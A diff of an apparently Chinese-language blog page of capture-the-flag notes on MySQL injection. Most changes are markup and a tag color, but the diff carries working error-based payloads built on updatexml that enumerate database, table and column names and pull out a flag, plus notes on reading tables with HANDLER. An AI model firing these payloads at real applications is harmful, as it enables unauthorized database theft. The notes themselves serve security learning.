@@ -345,7 +345,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Sql/" style="color: #ffa2c4">Sql</a>
+                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
             </span>
             
         </span>
@@ -792,35 +792,40 @@ union select column_name<span class="token punctuation">,</span>column_name from
 <ul>
 <li><p>查数据库名：</p>
 <p>注意查询 SCHEMA_NAME 会返回多行结果，这里需要主动使用 <strong>limit</strong> 方法限制查询返回的记录数，也可以用<code>group_concat(SCHEMA_NAME)</code>把记录集中在一行，但是 updatexml 最多回显32个字符，所以还需要 <code>substr</code> 进行截取</p>
+</li>
+</ul>
 <blockquote>
 <p>在 MySQL 中，LIMIT 关键字用于限制 SQL 查询结果集中返回的记录数，通常用于分页查询、大量数据的截取以及提高查询效率</p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token keyword">LIMIT</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">;</span>
 <span class="token comment">-- 跳过前 10 条记录，从第 11 条记录开始，返回 5 条记录。第一个参数 10 是偏移量（可省略，省略时从第0条记录算起），第二个参数 5 是返回的记录数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>构造 payload：</p>
+<p>  构造 payload：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),0x7e),1)--+
 
 或
 1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415105539147.png" alt="image-20250415105539147"></p>
-<p>数据库ctfshow</p>
-</li>
-<li><p>查表名：</p>
+<p>  <img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415105539147.png" alt="image-20250415105539147"></p>
+<p>  数据库ctfshow</p>
+<ul>
+<li>查表名：</li>
+</ul>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>ctfshow'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>得到 flagpuck 表</p>
-</li>
-<li><p>查列名：</p>
+<p>  得到 flagpuck 表</p>
+<ul>
+<li>查列名：</li>
+</ul>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='</span>ctfshow<span class="token string">' and table_name='</span>flagpuck'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>得到 id, flag33 列</p>
-</li>
-<li><p>查字段：</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,substr((select group_concat(flag33) from ctfshow.flagpuck),1,32),0x7e),1)--+
-1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag33<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagpuck<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<p>  得到 id, flag33 列</p>
+<ul>
+<li>查字段：</li>
 </ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,substr((select group_concat(flag33) from ctfshow.flagpuck),1,32),0x7e),1)--+
+1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag33<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flagpuck<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>less-6 闭合方式为 <code>1&quot;</code>，其余不变</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)--+
 
@@ -1796,14 +1801,16 @@ payload <span class="token operator">=</span> <span class="token string">"select
 </li>
 <li><p><strong>handler</strong>:一行一行显示库中内容</p>
 <p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230815205244766.png" alt="image-20230815205244766"></p>
+</li>
+</ul>
+</li>
+</ol>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> table_name <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span>为新创建的表<span class="token punctuation">)</span>
 <span class="token keyword">handler</span> table_name <span class="token keyword">read</span><span class="token punctuation">;</span>读出什么输出什么
 
 <span class="token keyword">handler</span> tablename <span class="token keyword">read</span> <span class="token keyword">first</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ul>
-</li>
-</ol>
+<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ul>
 <li><p>单字段过滤：16进制编码<code>hex(a.username)</code></p>
 </li>
